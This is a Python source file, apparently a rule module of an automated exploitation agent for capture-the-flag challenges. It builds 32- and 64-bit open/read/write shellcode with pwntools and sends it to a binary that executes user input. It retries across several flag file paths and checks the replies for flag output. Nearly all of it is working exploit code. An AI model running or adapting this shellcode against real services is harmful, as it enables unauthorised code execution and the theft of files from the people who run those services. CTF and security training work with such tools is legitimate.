"""Rule: when binary reads shellcode to executable buffer, send ORW shellcode."""
from __future__ import annotations

from pwn import log

from autopwn.agent.state import ActionResult, AttemptRecord
from autopwn.agent.action_utils import open_target, safe_close


def _condition(state) -> bool:
    return bool(state.discovered_facts.get("shellcode_exec"))


def _action(state) -> ActionResult:
    """Send open/read/write shellcode to read flag file."""
    ctx = state.ctx
    info = state.discovered_facts["shellcode_exec"]

    log.info("Agent orw_shellcode: sending ORW shellcode")

    # Build ORW shellcode for the target architecture
    if ctx.bits == 32:
        shellcode = _orw_shellcode_32()
    else:
        shellcode = _orw_shellcode_64()

    io = None
    try:
        io = open_target(ctx)
        try:
            io.recv(timeout=1)
        except Exception:
            pass

        io.send(shellcode)

        import time
        time.sleep(1)

        try:
            output = io.recv(timeout=3)
            text = output.decode("utf-8", errors="replace")
            log.info(f"Agent orw_shellcode: output = {text[:200]}")
            if "flag" in text.lower() or "{" in text:
                log.success(f"Agent orw_shellcode: flag read! {text.strip()}")
                safe_close(io)
                return ActionResult(
                    success=True,
                    record=AttemptRecord(strategy="orw_shellcode", success=True, output=output),
                )
        except Exception:
            pass

        safe_close(io)
    except Exception as exc:
        log.debug(f"orw_shellcode error: {exc}")
        if io:
            safe_close(io)

    # Try with different flag paths
    for flag_path in [b"/home/flag\x00", b"./flag\x00", b"/flag\x00"]:
        io = None
        try:
            io = open_target(ctx)
            try:
                io.recv(timeout=1)
            except Exception:
                pass

            if ctx.bits == 32:
                sc = _orw_shellcode_32(flag_path)
            else:
                sc = _orw_shellcode_64(flag_path)

            io.send(sc)

            import time
            time.sleep(1)

            try:
                output = io.recv(timeout=3)
                text = output.decode("utf-8", errors="replace")
                if "flag" in text.lower() or "{" in text:
                    log.success(f"Agent orw_shellcode: flag! {text.strip()}")
                    safe_close(io)
                    return ActionResult(
                        success=True,
                        record=AttemptRecord(strategy="orw_shellcode", success=True, output=output),
                    )
            except Exception:
                pass
            safe_close(io)
        except Exception:
            if io:
                safe_close(io)

    return ActionResult(
        success=False, terminal=True,
        record=AttemptRecord(strategy="orw_shellcode", diagnosis="no_flag_output"),
    )


def _orw_shellcode_32(flag_path: bytes = b"flag.txt\x00") -> bytes:
    """Build 32-bit open/read/write shellcode."""
    from pwn import asm, context as pwn_context
    old_arch = pwn_context.arch
    old_bits = pwn_context.bits
    pwn_context.arch = "i386"
    pwn_context.bits = 32

    # Pad flag_path to avoid null issues in push
    # Use stack to store flag path
    # Push "flag.txt" onto stack in reverse
    path = flag_path.rstrip(b"\x00")
    # Pad to multiple of 4
    while len(path) % 4 != 0:
        path += b"\x00"

    push_parts = []
    for i in range(len(path) - 4, -1, -4):
        chunk = path[i:i+4]
        val = int.from_bytes(chunk, "little")
        push_parts.append(f"push {val:#x}")

    push_str = "\n".join(push_parts)

    sc_asm = f"""
    /* open("flag.txt", 0) */
    xor edx, edx
    push edx          /* null terminator */
    {push_str}
    mov ebx, esp
    xor ecx, ecx      /* O_RDONLY */
    mov eax, 5         /* sys_open */
    int 0x80

    /* read(fd, esp-0x100, 0x100) */
    mov ebx, eax       /* fd */
    sub esp, 0x100
    mov ecx, esp       /* buf */
    mov edx, 0x100     /* count */
    mov eax, 3         /* sys_read */
    int 0x80

    /* write(1, buf, eax) */
    mov edx, eax       /* bytes read */
    mov ebx, 1         /* stdout */
    mov ecx, esp       /* buf */
    mov eax, 4         /* sys_write */
    int 0x80
    """

    try:
        code = asm(sc_asm)
    finally:
        pwn_context.arch = old_arch
        pwn_context.bits = old_bits
    return code


def _orw_shellcode_64(flag_path: bytes = b"flag.txt\x00") -> bytes:
    """Build 64-bit open/read/write shellcode."""
    from pwn import asm, context as pwn_context
    old_arch = pwn_context.arch
    old_bits = pwn_context.bits
    pwn_context.arch = "amd64"
    pwn_context.bits = 64

    path = flag_path.rstrip(b"\x00")
    while len(path) % 8 != 0:
        path += b"\x00"

    push_parts = []
    for i in range(len(path) - 8, -1, -8):
        chunk = path[i:i+8]
        val = int.from_bytes(chunk, "little")
        push_parts.append(f"mov rax, {val:#x}")
        push_parts.append("push rax")

    push_str = "\n".join(push_parts)

    sc_asm = f"""
    /* open("flag.txt", 0) */
    xor rsi, rsi
    push rsi
    {push_str}
    mov rdi, rsp
    xor rsi, rsi
    mov rax, 2
    syscall

    /* read(fd, rsp-0x100, 0x100) */
    mov rdi, rax
    sub rsp, 0x100
    mov rsi, rsp
    mov rdx, 0x100
    xor rax, rax
    syscall

    /* write(1, buf, rax) */
    mov rdx, rax
    mov rdi, 1
    mov rsi, rsp
    mov rax, 1
    syscall
    """

    try:
        code = asm(sc_asm)
    finally:
        pwn_context.arch = old_arch
        pwn_context.bits = old_bits
    return code


RULES = [
    ("orw_shellcode", 82, "send ORW shellcode when binary executes user input",
     _condition, _action),
]
